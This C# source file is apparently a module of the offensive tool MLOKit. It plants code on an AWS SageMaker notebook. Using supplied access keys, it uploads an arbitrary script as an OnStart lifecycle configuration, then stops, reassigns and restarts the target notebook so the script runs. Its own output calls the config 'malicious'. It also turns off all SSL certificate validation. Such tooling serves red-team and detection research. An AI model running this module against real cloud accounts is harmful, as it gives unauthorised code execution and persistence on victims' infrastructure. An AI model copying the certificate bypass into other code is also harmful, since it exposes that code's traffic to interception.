using System;
using System.Net;
using System.Threading.Tasks;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Amazon.SageMaker;
using Amazon.SageMaker.Model;
using System.IO;
using System.Threading;
using Amazon;

namespace MLOKit.Modules.SageMaker
{
    class AddNotebookTrigger
    {
        public static async Task execute(string credential, string platform, string notebookName, string script, RegionEndpoint endpoint)
        {
            // Generate module header
            Console.WriteLine(Utilities.ArgUtils.GenerateHeader("add-notebook-trigger", credential, platform));


            // ignore SSL errors
            ServicePointManager.ServerCertificateValidationCallback = delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            try
            {

                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Performing add-notebook-trigger module for " + platform);
                Console.WriteLine("");

                // check if credentials provided are valid
                Console.WriteLine("[*] INFO: Checking credentials provided");
                Console.WriteLine("");

                string[] splitCreds = credential.Split(';');
                string accessKey = splitCreds[0];
                string secretKey = splitCreds[1];

                AmazonSageMakerClient sagemakerClient = new AmazonSageMakerClient(accessKey, secretKey, endpoint);

                // if the script file provided exists, proceed
                if (File.Exists(script)){

                    // Create lifecycle config
                    Console.WriteLine("[*] INFO: Creating notebook instance lifecycle config");
                    Console.WriteLine("");
                    string randomConfigName = "MLOKit-" + Utilities.FileUtils.generateRandomName();
                    CreateNotebookInstanceLifecycleConfigRequest configCreateRequest = new CreateNotebookInstanceLifecycleConfigRequest();
                    NotebookInstanceLifecycleHook hook = new NotebookInstanceLifecycleHook();
                    hook.Content = Convert.ToBase64String(File.ReadAllBytes(script));
                    configCreateRequest.NotebookInstanceLifecycleConfigName = randomConfigName;
                    configCreateRequest.OnStart.Add(hook);
                    CreateNotebookInstanceLifecycleConfigResponse configCreateResponse = await sagemakerClient.CreateNotebookInstanceLifecycleConfigAsync(configCreateRequest);

                    if (configCreateResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
                    {
                        Console.WriteLine("[+] SUCCESS: Notebook instance lifecycle config created with name: " + randomConfigName);
                        Console.WriteLine("");
                    }


                    // Stop target notebook instance
                    Console.WriteLine("[*] INFO: Stopping target notebook instance with name: " + notebookName);
                    Console.WriteLine("");
                    StopNotebookInstanceRequest stopNotebook = new StopNotebookInstanceRequest();
                    stopNotebook.NotebookInstanceName = notebookName;
                    StopNotebookInstanceResponse stopNotebookResponse = await sagemakerClient.StopNotebookInstanceAsync(stopNotebook);

                    if (stopNotebookResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
                    {

                        string nextToken = null;
                        var notebookRequest = new ListNotebookInstancesRequest
                        {
                            MaxResults = 100, // Optional: control page size (max 100)
                            NextToken = nextToken
                        };
                        notebookRequest.NameContains = notebookName;
                        ListNotebookInstancesResponse response = await sagemakerClient.ListNotebookInstancesAsync(notebookRequest);

                        if (response.HttpStatusCode.ToString().ToLower().Equals("ok"))
                        {
                            // create table header
                            string tableHeader = string.Format("{0,50} | {1,20} | {2,20} | {3,30}", "Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config");
                            Console.WriteLine(tableHeader);
                            Console.WriteLine(new String('-', tableHeader.Length));

                            // iterate through each notebook and list details
                            foreach (var notebook in response.NotebookInstances)
                            {
                                string creationTime = notebook.CreationTime.ToShortDateString();
                                Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", notebook.NotebookInstanceName, creationTime, notebook.NotebookInstanceStatus, notebook.NotebookInstanceLifecycleConfigName);
                            }

                        }

                    }

                    // sleep for 2 minutes to allow time for notebook to stop
                    Console.WriteLine("");
                    Console.WriteLine("[*] INFO: Sleeping for 2 minutes to allow time for notebook to stop");
                    Console.WriteLine("");
                    Thread.Sleep(120000);
                    Console.WriteLine("[+] SUCCESS: Notebook instance with name of " + notebookName + " has been stopped successfully.");
                    Console.WriteLine("");


                    // Update lifecycle config for target notebook instance
                    Console.WriteLine("[*] INFO: Updated notebook named " + notebookName + "with lifecycle config with name " + randomConfigName);
                    Console.WriteLine("");
                    UpdateNotebookInstanceRequest updateNotebook = new UpdateNotebookInstanceRequest();
                    updateNotebook.LifecycleConfigName = randomConfigName;
                    updateNotebook.NotebookInstanceName = notebookName;
                    UpdateNotebookInstanceResponse updateNotebookResponse = await sagemakerClient.UpdateNotebookInstanceAsync(updateNotebook);

                    if (updateNotebookResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
                    {
                       
                        // create table header
                        string tableHeader = string.Format("{0,50} | {1,20} | {2,20} | {3,30}", "Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config");
                        Console.WriteLine(tableHeader);
                        Console.WriteLine(new String('-', tableHeader.Length));

                        string nextToken = null;
                        var notebookRequest = new ListNotebookInstancesRequest
                        {
                            MaxResults = 100, // Optional: control page size (max 100)
                            NextToken = nextToken
                        };
                        notebookRequest.NameContains = notebookName;
                        ListNotebookInstancesResponse response = await sagemakerClient.ListNotebookInstancesAsync(notebookRequest);

                        // iterate through each notebook and list details
                        foreach (var notebook in response.NotebookInstances)
                        {
                            string creationTime = notebook.CreationTime.ToShortDateString();
                            Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", notebook.NotebookInstanceName, creationTime, notebook.NotebookInstanceStatus, notebook.NotebookInstanceLifecycleConfigName);
                        }

                    }

                    // sleep for 2 minutes to allow time for notebook lifecycle config change to take place
                    Console.WriteLine("");
                    Console.WriteLine("[*] INFO: Sleeping for 2 minutes to allow time for notebook instance lifecycle config to be assigned");
                    Console.WriteLine("");
                    Thread.Sleep(120000);
                    Console.WriteLine("[+] SUCCESS: Malicious notebook instance lifecycle config assigned to notebook with name: " + notebookName);
                    Console.WriteLine("");


                    // Start target notebook instance
                    Console.WriteLine("[*] INFO: Starting target notebook instance with name: " + notebookName);
                    Console.WriteLine("");
                    StartNotebookInstanceRequest startNotebook = new StartNotebookInstanceRequest();
                    startNotebook.NotebookInstanceName = notebookName;
                    StartNotebookInstanceResponse startNotebookResponse = await sagemakerClient.StartNotebookInstanceAsync(startNotebook);

                    if (startNotebookResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
                    {

                        // create table header
                        string tableHeader = string.Format("{0,50} | {1,20} | {2,20} | {3,30}", "Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config");
                        Console.WriteLine(tableHeader);
                        Console.WriteLine(new String('-', tableHeader.Length));
                        string nextToken = null;
                        var notebookRequest = new ListNotebookInstancesRequest
                        {
                            MaxResults = 100, // Optional: control page size (max 100)
                            NextToken = nextToken
                        };
                        notebookRequest.NameContains = notebookName;
                        ListNotebookInstancesResponse response = await sagemakerClient.ListNotebookInstancesAsync(notebookRequest);

                        // iterate through each notebook and list details
                        foreach (var notebook in response.NotebookInstances)
                        {
                            string creationTime = notebook.CreationTime.ToShortDateString();
                            Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", notebook.NotebookInstanceName, creationTime, notebook.NotebookInstanceStatus, notebook.NotebookInstanceLifecycleConfigName);
                        }

                    }

                    // sleep for 2 minutes to allow time for notebook instance to start
                    Console.WriteLine("");
                    Console.WriteLine("[*] INFO: Sleeping for 2 minutes to allow time for notebook to start");
                    Console.WriteLine("");
                    Thread.Sleep(120000);
                    Console.WriteLine("[+] SUCCESS: Successfully started notebook with name: " + notebookName);
                    Console.WriteLine("");

                }
                // otherwise display error and return
                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Script file provided does not exist. Please check the path again.");
                    Console.WriteLine("");
                }





               


            }
            catch (Exception ex)
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Please check your credentials and try again");
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: " + ex.Message);
                Console.WriteLine("");
            }

        }

    }
}
